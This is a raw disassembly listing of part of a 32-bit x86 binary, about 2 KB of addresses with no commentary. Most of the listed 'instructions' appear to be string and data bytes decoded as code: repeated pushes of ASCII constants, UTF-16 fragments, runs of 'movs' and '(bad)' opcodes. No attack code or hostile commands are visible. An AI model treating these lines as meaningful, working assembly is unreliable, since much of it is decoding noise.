  42230f:	ins    BYTE PTR es:[edi],dx
  422310:	push   0x686c6c65
  422315:	gs ins BYTE PTR es:[edi],dx
  422317:	ins    BYTE PTR es:[edi],dx
  422318:	push   0x686c6c65
  42231d:	gs ins BYTE PTR es:[edi],dx
  42231f:	ins    BYTE PTR es:[edi],dx
  422320:	push   0x686c6c65
  422325:	gs ins BYTE PTR es:[edi],dx
  422327:	ins    BYTE PTR es:[edi],dx
  422328:	add    BYTE PTR [eax],al
  42232a:	add    BYTE PTR [eax],al
  42232c:	outs   dx,DWORD PTR ds:[esi]
  42232d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422331:	add    BYTE PTR [ecx+0x0],ah
  422334:	jne    0x422336
  422336:	je     0x422338
  422338:	xor    eax,DWORD PTR [eax]
  42233a:	xor    al,BYTE PTR [eax]
  42233c:	add    BYTE PTR [eax],al
  42233e:	add    BYTE PTR [eax],al
  422340:	push   0x61006500
  422345:	add    BYTE PTR [esi+0x0],dh
  422348:	add    BYTE PTR gs:[esi+0x0],ch
  42234c:	push   0x61006500
  422351:	add    BYTE PTR [esi+0x0],dh
  422354:	add    BYTE PTR gs:[esi+0x0],ch
  422358:	push   0x61006500
  42235d:	add    BYTE PTR [esi+0x0],dh
  422360:	add    BYTE PTR gs:[esi+0x0],ch
  422364:	push   0x61006500
  422369:	add    BYTE PTR [esi+0x0],dh
  42236c:	add    BYTE PTR gs:[esi+0x0],ch
  422370:	push   0x61006500
  422375:	add    BYTE PTR [esi+0x0],dh
  422378:	add    BYTE PTR gs:[esi+0x0],ch
  42237c:	push   0x61006500
  422381:	add    BYTE PTR [esi+0x0],dh
  422384:	add    BYTE PTR gs:[esi+0x0],ch
  422388:	push   0x61006500
  42238d:	add    BYTE PTR [esi+0x0],dh
  422390:	add    BYTE PTR gs:[esi+0x0],ch
  422394:	push   0x61006500
  422399:	add    BYTE PTR [esi+0x0],dh
  42239c:	add    BYTE PTR gs:[esi+0x0],ch
  4223a0:	push   0x61006500
  4223a5:	add    BYTE PTR [esi+0x0],dh
  4223a8:	add    BYTE PTR gs:[esi+0x0],ch
  4223ac:	add    BYTE PTR [eax],al
  4223ae:	add    BYTE PTR [eax],al
  4223b0:	sub    al,0x23
  4223b2:	inc    edx
  4223b3:	add    BYTE PTR [edi+0x6c],cl
  4223b6:	gs dec ecx
  4223b8:	arpl   WORD PTR [edi+0x6e],bp
  4223bb:	push   esp
  4223bc:	outs   dx,DWORD PTR ds:[esi]
  4223bd:	inc    ebx
  4223be:	jne    0x422432
  4223c0:	jae    0x422431
  4223c2:	jb     0x4223c4
  4223c4:	mov    ah,0x23
  4223c6:	inc    edx
	...
  4223cf:	add    BYTE PTR [eax+0x27],dh
  4223d2:	inc    edx
  4223d3:	add    BYTE PTR [eax+0x27],bh
  4223d6:	inc    edx
  4223d7:	add    BYTE PTR [eax],dh
  4223d9:	es inc edx
  4223db:	add    dl,dh
  4223dd:	inc    ebx
  4223de:	push   ebx
  4223df:	mov    WORD PTR ds:0x1a49ba4,ss
  4223e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e6:	popf   
  4223e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e8:	jno    0x42238e
  4223ea:	xchg   edi,eax
  4223eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ec:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f4:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  4223fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223fc:	rol    DWORD PTR [edx-0x5b6a732f],cl
  422402:	adc    eax,0x1a49ba4
  422407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422408:	popf   
  422409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240a:	jno    0x4223b0
  42240c:	xchg   edi,eax
  42240d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240e:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422416:	xor    eax,0x9ba485a4
  42241b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241c:	mov    ebx,0xd1e2d3a4
  422421:	in     al,dx
  422422:	xchg   ebp,eax
  422423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422424:	adc    eax,0x3ba49ba4
  422429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242a:	popf   
  42242b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242c:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  422433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422434:	fwait
  422435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422436:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  42243d:	sub    al,0xf7
  42243f:	cs pop ss
  422441:	push   cs
  422442:	adc    eax,0x3a49108
  422447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422448:	fwait
  422449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422452:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245a:	shl    DWORD PTR [edx],cl
  42245c:	shr    DWORD PTR [ecx+esi*8],1
  42245f:	or     al,0xf7
  422461:	push   cs
  422462:	pop    ss
  422463:	outs   dx,BYTE PTR ds:[esi]
  422464:	adc    eax,0x3a49168
  422469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246a:	fwait
  42246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246c:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422474:	xor    eax,0x9ba48da4
  422479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247a:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  422482:	imul   DWORD PTR [esi+0x17]
  422485:	dec    esi
  422486:	adc    eax,0x37a49148
  42248b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248c:	fwait
  42248d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248e:	jae    0x422434
  422490:	popf   
  422491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422492:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  422499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249a:	fwait
  42249b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249c:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  4224a4:	test   DWORD PTR [esi+0x16],0x91a814ae
  4224ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ac:	aaa    
  4224ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ae:	fwait
  4224af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b0:	jae    0x422456
  4224b2:	popf   
  4224b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b4:	pop    ss
  4224b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b6:	xchg   ebp,eax
  4224b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b8:	push   ecx
  4224b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ba:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  4224c1:	inc    edx
  4224c2:	ror    DWORD PTR [eax+esi*8-0x54],1
  4224c6:	imul   BYTE PTR [esi-0x77eb71ea]
  4224cc:	xchg   ecx,eax
  4224cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ce:	aaa    
  4224cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d0:	fwait
  4224d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d2:	jae    0x422478
  4224d4:	popf   
  4224d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d6:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  4224dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224de:	fwait
  4224df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e0:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  4224e7:	mov    esi,?
  4224e9:	mov    ss,WORD PTR [esi]
  4224eb:	out    dx,al
  4224ec:	adc    al,0xe8
  4224ee:	xchg   ecx,eax
  4224ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f0:	aaa    
  4224f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f2:	fwait
  4224f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f4:	jae    0x42249a
  4224f6:	popf   
  4224f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f8:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  4224ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422500:	fwait
  422501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422502:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  42250a:	imul   dh
  42250c:	push   ss
  42250d:	into   
  42250e:	adc    al,0xc8
  422510:	xchg   ecx,eax
  422511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422512:	cmp    eax,0x51a49ba4
  422517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422518:	popf   
  422519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251a:	jnp    0x4224c0
  42251c:	xchg   ebx,eax
  42251d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251e:	fwait
  42251f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422520:	xchg   ecx,eax
  422521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422522:	shl    dl,cl
  422524:	shr    ah,1
  422526:	lock int3 
  422528:	test   dh,0x16
  42252b:	cs adc al,0x28
  42252e:	push   ss
  42252f:	push   cs
  422530:	adc    al,0x8
  422532:	xchg   ebx,eax
  422533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422534:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  42253b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42253c:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422544:	fwait
  422545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422546:	lea    esp,[edx+edx*8-0xfd32fde]
  42254d:	or     al,0xf6
  42254f:	push   cs
  422550:	push   ss
  422551:	outs   dx,BYTE PTR ds:[esi]
  422552:	adc    al,0x68
  422554:	xchg   ecx,eax
  422555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422556:	add    BYTE PTR [eax],al
  422558:	loopne 0x42257d
  42255a:	inc    edx
  42255b:	add    ah,ch
  42255d:	and    eax,0x25f40042
  422562:	inc    edx
  422563:	add    BYTE PTR [edi+eiz*1+0x42],bh
  422567:	add    al,bl
  422569:	and    eax,DWORD PTR [edx+0x0]
  42256c:	clc    
  42256d:	and    eax,0x7c5a0042
  422572:	inc    edx
  422573:	add    dl,dl
  422575:	jle    0x4225b9
  422577:	add    al,ch
  422579:	es inc edx
  42257b:	add    BYTE PTR [edi+eiz*1+0x42],ch
  42257f:	add    ah,dl
  422581:	and    eax,0x25d80042
  422586:	inc    edx
  422587:	add    BYTE PTR [eax+0x27],ch
  42258a:	inc    edx
  42258b:	add    BYTE PTR [esi+eiz*1],bh
  42258e:	inc    edx
  42258f:	add    BYTE PTR [edx-0x35],cl
  422592:	push   es
  422593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422594:	scas   al,BYTE PTR es:[edi]
  422595:	or     al,0x6
  422597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422598:	lock and eax,0x26a00042
  42259e:	inc    edx
  42259f:	add    BYTE PTR [esi+eiz*1+0x26c00042],dh
  4225a6:	inc    edx
  4225a7:	add    al,dl
  4225a9:	es inc edx
  4225ab:	add    BYTE PTR [eax],ch
  4225ad:	es inc edx
  4225af:	add    ah,bl
  4225b1:	and    eax,DWORD PTR [edx+0x0]
  4225b4:	dec    eax
  4225b5:	es inc edx
  4225b7:	add    BYTE PTR [eax],bh
  4225b9:	es inc edx
  4225bb:	add    BYTE PTR [eax-0x51ffbdd9],al
  4225c1:	call   0xbde7:0x4338a406
  4225c8:	pop    eax
  4225c9:	es inc edx
  4225cb:	add    BYTE PTR [eax+0x26],ah
  4225ce:	inc    edx
  4225cf:	add    ah,bh
  4225d1:	and    eax,0x87240042
  4225d6:	loopne 0x422595
  4225d8:	jbe    0x422655
  4225da:	pop    ds
  4225db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225dc:	add    BYTE PTR [eax],al
  4225de:	inc    eax
  4225df:	add    dl,ch
  4225e1:	rcl    dl,cl
  4225e3:	pop    ecx
  4225e4:	iret   
  4225e5:	jle    0x422629
  4225e7:	add    bl,bl
  4225e9:	outs   dx,DWORD PTR fs:[esi]
  4225eb:	arpl   WORD PTR [edi+0xf],si
  4225ee:	pop    ebx
  4225ef:	xor    DWORD PTR [esi-0x5],esi
  4225f2:	(bad)  
  4225f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225f4:	mov    dl,0xc
  4225f6:	xchg   ebx,eax
  4225f7:	test   al,0xe4
  4225f9:	and    eax,0xdaaa0042
  4225fe:	push   es
  4225ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422600:	stos   BYTE PTR es:[edi],al
  422601:	fiadd  WORD PTR [esi]
  422603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422605:	fiadd  DWORD PTR [esi]
  422607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422608:	mov    ds:0xbea406da,al
  42260d:	fiadd  DWORD PTR [esi]
  42260f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422610:	mov    edx,0xb6a406da
  422615:	fiadd  DWORD PTR [esi]
  422617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422618:	mov    dl,0xda
  42261a:	push   es
  42261b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42261c:	mov    ds,edx
  42261e:	push   es
  42261f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422620:	mov    bl,dl
  422622:	push   es
  422623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422624:	out    dx,al
  422625:	fiadd  DWORD PTR [esi]
  422627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422628:	dec    DWORD PTR [ebx]
  42262a:	adc    edi,DWORD PTR [edx]
  42262c:	aam    0x23
  42262e:	inc    edx
  42262f:	add    ch,al
  422631:	sub    BYTE PTR [edx+0x0],al
  422634:	pop    ss
  422635:	loop   0x4225c0
  422637:	js     0x4225e7
  422639:	call   0xa4d7:0xcb3aa406
  422640:	and    al,0x75
  422642:	add    BYTE PTR [eax],al
  422644:	shl    BYTE PTR [ebx],1
  422646:	inc    edx
  422647:	add    BYTE PTR [edx],ah
  422649:	inc    ebx
  42264a:	sbb    eax,DWORD PTR [edx+0x0]
	...
  422658:	hlt    
  422659:	clc    
  42265a:	sar    BYTE PTR [ebp+0x319340bf],cl
  422660:	sub    eax,DWORD PTR [edi+0x1f]
  422663:	jle    0x422665
	...
  422689:	add    BYTE PTR [eax],al
  42268b:	add    BYTE PTR [edx+0x7c],bl
  42268e:	inc    edx
	...
  42269b:	add    cl,bh
  42269d:	jmp    0xa48f26e3
  4226a2:	push   ecx
  4226a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a4:	jg     0x42264a
  4226a6:	inc    edi
  4226a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a8:	push   ecx
  4226a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226aa:	inc    ebx
  4226ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ac:	std    
  4226ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ae:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  4226b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b6:	push   ebx
  4226b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b8:	dec    ecx
  4226b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ba:	std    
  4226bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226bc:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  4226c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c4:	push   ecx
  4226c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c6:	jg     0x42266c
  4226c8:	std    
  4226c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ca:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  4226d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d2:	dec    ebx
  4226d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d4:	inc    ebx
  4226d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d6:	jne    0x42267c
  4226d8:	pop    ecx
  4226d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226da:	jnp    0x422680
  4226dc:	dec    ecx
  4226dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226de:	fwait
  4226df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4226e8:	xor    eax,eax
  4226ea:	xor    esp,DWORD PTR [eax]
  4226ec:	xor    eax,DWORD PTR [eax]
  4226ee:	xor    esp,DWORD PTR [eax+0x33]
  4226f1:	inc    eax
  4226f2:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  4226f8:	xor    al,al
  4226fa:	xor    ah,BYTE PTR [eax]
  4226fc:	xor    al,BYTE PTR [eax]
  4226fe:	xor    ah,BYTE PTR [eax+0x32]
  422701:	inc    eax
  422702:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  422708:	xor    ecx,esp
  42270a:	xor    ecx,esi
  42270c:	xor    ecx,eax
  42270e:	xor    ecx,edx
  422710:	xor    edx,esp
  422712:	xor    edx,esi
  422714:	xor    edx,eax
  422716:	xor    edx,edx
  422718:	xor    ebx,esp
  42271a:	xor    ebx,esi
  42271c:	xor    ebx,eax
  42271e:	xor    ebx,edx
  422720:	xor    eax,esi
  422722:	push   ebx
  422723:	shl    BYTE PTR [ebx-0x40],0x93
  422727:	rcl    DWORD PTR [esi-0x56],0x15
  42272b:	into   
  42272c:	xchg   ebp,eax
  42272d:	dec    ecx
  42272e:	xor    ecx,esp
  422730:	sbb    eax,0x50abaae2
  422735:	push   0x1e
  422737:	cs je  0x42274e
  42273a:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422740:	imul   edi,edx,0xffffffd5
  422743:	leave  
  422744:	daa    
  422745:	dec    eax
  422746:	out    dx,eax
  422747:	pushf  
  422748:	mov    dh,0xdf
  42274a:	dec    esi
  42274b:	xchg   ebp,eax
  42274c:	lock xor DWORD PTR [esi-0x6c],ebp
  422750:	inc    ebp
  422751:	or     eax,0xc1470876
  422756:	js     0x422713
  422758:	popa   
  422759:	pop    ecx
  42275a:	jecxz  0x4227c7
  42275c:	mov    BYTE PTR [edx-0x56],0x5
  422760:	cs enter 0xaa46,0x44
  422765:	aas    
  422766:	inc    ebp
  422767:	leave  
  422768:	test   BYTE PTR [ebx+0x819a593],0xd8
  42276f:	jl     0x4227d9
  422771:	mov    es,WORD PTR [edx+0x0]
  422774:	jb     0x4227d0
  422776:	pop    ss
  422777:	sub    ebx,esp
  422779:	and    eax,0x26400042
  42277e:	inc    edx
  42277f:	add    BYTE PTR [esi-0x5],dh
  422782:	fbld   TBYTE PTR [ebp+0x0]
	...
  422790:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  422796:	popa   
  422797:	arpl   WORD PTR [edi+0x7a],bp
  42279a:	popa   
  42279b:	outs   dx,DWORD PTR ds:[si]
  42279d:	gs ins DWORD PTR es:[edi],dx
  42279f:	jae    0x4227e3
  4227a1:	outs   dx,DWORD PTR ds:[esi]
  4227a2:	ins    BYTE PTR es:[edi],dx
  4227a3:	gs mov cl,0x65
  4227a6:	in     eax,dx
  4227a7:	jg     0x4227e2
  4227a9:	ja     0x422814
  4227ab:	jp     0x4227a0
  4227ad:	inc    esp
  4227ae:	push   0x1b
  4227b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b1:	push   ecx
  4227b2:	dec    esp
  4227b3:	gs jb  0x42282f
  4227b6:	popa   
  4227b7:	push   ebx
  4227b8:	jne    0x42282b
  4227ba:	jae    0x42281d
  4227bc:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  4227c3:	inc    esp
  4227c4:	(bad)  [edx+0x65]
  4227c7:	jae    0x42281f
  4227c9:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  4227d0:	jb     0x422834
  4227d2:	gs je  0x4227a8
  4227d5:	lds    edx,FWORD PTR [eax-0x68]
  4227d8:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  4227dc:	fs jne 0x42284e
  4227df:	push   eax
  4227e0:	gs fs jae 0x422851
  4227e4:	popa   
  4227e5:	ins    DWORD PTR es:[edi],dx
  4227e6:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  4227f9:	add    BYTE PTR [eax],al
  4227fb:	add    BYTE PTR [esp+ecx*4],ch
  4227fe:	push   ss
  4227ff:	mov    esi,0x6f4c8773
  422804:	jb     0x422874
  422806:	jno    0x422871
  422808:	or     al,0x36
  42280a:	lods   al,BYTE PTR ds:[esi]
  42280b:	repnz push edx
  42280d:	je     0x42287e
  42280f:	je     0x422855
  422811:	js     0x4227cf
  422813:	cmc    
  422814:	outs   dx,DWORD PTR ds:[esi]
  422815:	ins    DWORD PTR es:[edi],dx
  422816:	popa   
  422817:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  42281e:	popa   
  42281f:	jb     0x422896
  422821:	push   0x68736f79
  422826:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  42282d:	mov    ch,0xa5
  42282f:	jns    0x4228a4
  422831:	outs   dx,DWORD PTR ds:[esi]
  422832:	addr16 popa 
  422834:	add    BYTE PTR [bp+si],bh
  422837:	sub    bh,cl
  422839:	icebp  
  42283a:	gs ins BYTE PTR es:[edi],dx
  42283c:	jae    0x422886
  42283e:	popa   
  42283f:	je     0x4228a9
  422841:	ins    DWORD PTR es:[edi],dx
  422842:	add    BYTE PTR gs:[bx+si],al
  422846:	in     al,dx
  422847:	mov    ecx,0x414ad1d2
  42284c:	ins    DWORD PTR es:[edi],dx
  42284d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422854:	gs ins DWORD PTR es:[edi],dx
  422856:	add    BYTE PTR [eax],al
  422858:	jne    0x42286a
  42285a:	popa   
  42285b:	or     BYTE PTR [esi+0x73654dbb],al
  422861:	popa   
  422862:	push   0x78000061
  422867:	loope  0x4228ab
  422869:	stos   BYTE PTR es:[edi],al
  42286a:	je     0x4228cd
  42286c:	push   edi
  42286d:	popa   
  42286e:	jb     0x4228db
  422870:	jae    0x4228dd
  422872:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  422879:	loope  0x422847
  42287b:	aad    0x6f
  42287d:	jb     0x4228eb
  42287f:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  422886:	je     0x42289b
  422888:	adc    al,BYTE PTR [ebp+0x77646172]
  42288e:	outs   dx,DWORD PTR ds:[esi]
  42288f:	gs ins DWORD PTR es:[edi],dx
  422891:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  422898:	outs   dx,BYTE PTR ds:[esi]
  422899:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  4228a0:	ja     0x422906
  4228a2:	outs   dx,DWORD PTR ds:[esi]
  4228a3:	popa   
  4228a4:	outs   dx,BYTE PTR ds:[esi]
  4228a5:	gs jae 0x42290a
  4228a8:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  4228af:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  4228b7:	inc    ebx
  4228b8:	jb     0x422873
  4228ba:	sbb    al,0xd9
  4228bc:	jo     0x422927
  4228be:	addr16 js 0x422936
  4228c1:	jo     0x422938
  4228c3:	fs add ch,cl
  4228c6:	xchg   esi,eax
  4228c7:	in     eax,dx
  4228c8:	jno    0x42293b
  4228ca:	iret   
  4228cb:	jbe    0x4228c6
  4228cd:	or     dh,BYTE PTR [esi-0x3]
  4228d0:	cwde   
  4228d1:	int    0xd6
  4228d3:	std    
  4228d4:	pop    ebp
  4228d5:	fsubr  DWORD PTR [edi]
  4228d7:	dec    edx
  4228d8:	xor    eax,0xd6cd860a
  4228dd:	stc    
  4228de:	inc    ebx
  4228df:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  4228e5:	dec    edx
  4228e6:	sbb    BYTE PTR [ecx+0x52],bh
  4228e9:	mov    ch,al
  4228eb:	jns    0x42293f
  4228ed:	dec    edx
  4228ee:	sbb    BYTE PTR [ecx+0x6e],bh
  4228f1:	xchg   edx,eax
  4228f2:	cmp    eax,0xcd96c5cb
  4228f7:	in     eax,dx
  4228f8:	jno    0x42296b
  4228fa:	iret   
  4228fb:	jbe    0x4228f6
  4228fd:	or     dh,BYTE PTR [esi-0x3]
  422900:	int    0x96
  422902:	std    
  422903:	pop    ebp
  422904:	jns    0x422951
  422906:	pop    edx
  422907:	xor    eax,0x96cd920a
  42290c:	stc    
  42290d:	inc    ebx
  42290e:	icebp  
  42290f:	(bad)  
  422910:	das    
  422911:	int    0x76
  422913:	mov    BYTE PTR [ecx+0x6e],bh
  422916:	mov    DWORD PTR [edx-0x13749387],esi
  42291c:	jns    0x42298c
  42291e:	xchg   BYTE PTR [edi-0x3d789187],ah
  422924:	retf   
  422925:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42292c:	jno    0x4228fd
  42292e:	jbe    0x422929
  422930:	or     dh,BYTE PTR [esi-0x3]
  422933:	int    0x96
  422935:	std    
  422936:	pop    ebp
  422937:	fdiv   DWORD PTR [ebx-0x6df55465]
  42293d:	int    0x96
  42293f:	stc    
  422940:	inc    ebx
  422941:	icebp  
  422942:	(bad)  
  422943:	test   BYTE PTR [ecx+0x6e],bh
  422946:	mov    ebp,esp
  422948:	int    0x76
  42294a:	mov    BYTE PTR [ecx+0x6e],bh
  42294d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422954:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42295b:	jno    0x42292c
  42295d:	jbe    0x422958
  42295f:	or     dh,BYTE PTR [esi-0x3]
  422962:	cwde   
  422963:	int    0xd6
  422965:	std    
  422966:	pop    ebp
  422967:	ret    0x2be4
  42296a:	cmp    DWORD PTR [edx],ecx
  42296c:	xchg   ch,cl
  42296e:	(bad)  
  42296f:	stc    
  422970:	inc    ebx
  422971:	adc    DWORD PTR [eax+0x52794ad6],ebp
  422977:	test   BYTE PTR [ebx-0x78913648],ch
  42297d:	ret    0x79ab
  422980:	xchg   edx,eax
  422981:	aad    0xcb
  422983:	lds    edx,FWORD PTR [esi+0x7171edcd]
  422989:	iret   
  42298a:	jbe    0x422985
  42298c:	or     dh,BYTE PTR [esi-0x3]
  42298f:	int    0x96
  422991:	std    
  422992:	pop    ebp
  422993:	pop    ecx
  422994:	ins    BYTE PTR es:[edi],dx
  422995:	cmp    dh,BYTE PTR ds:0x96cd920a
  42299b:	stc    
  42299c:	inc    ebx
  42299d:	icebp  
  42299e:	(bad)  
  42299f:	push   ebx
  4229a0:	int    0x76
  4229a2:	mov    BYTE PTR [ecx+0x6e],bh
  4229a5:	mov    BYTE PTR [edi+0x47816c79],ah
  4229ab:	jns    0x422a1b
  4229ad:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  4229b3:	call   0xcded:0xcd965b98
  4229ba:	jbe    0x4229f0
  4229bc:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  4229c3:	sbb    al,0x81
  4229c5:	(bad)  
  4229c6:	and    al,0x98
  4229c8:	int    0xd6
  4229ca:	adc    al,0x47
  4229cc:	mov    ds:0xff8eca62,al
  4229d1:	add    al,0x7d
  4229d3:	add    ch,dl
  4229d5:	lods   eax,DWORD PTR ds:[esi]
  4229d6:	clc    
  4229d7:	icebp  
  4229d8:	jo     0x4229a4
  4229da:	(bad)  
  4229dc:	jge    0x4229de
  4229de:	aad    0xad
  4229e0:	clc    
  4229e1:	icebp  
  4229e2:	jo     0x422976
  4229e4:	adc    ecx,ebp
  4229e6:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  4229ed:	jo     0x422a5f
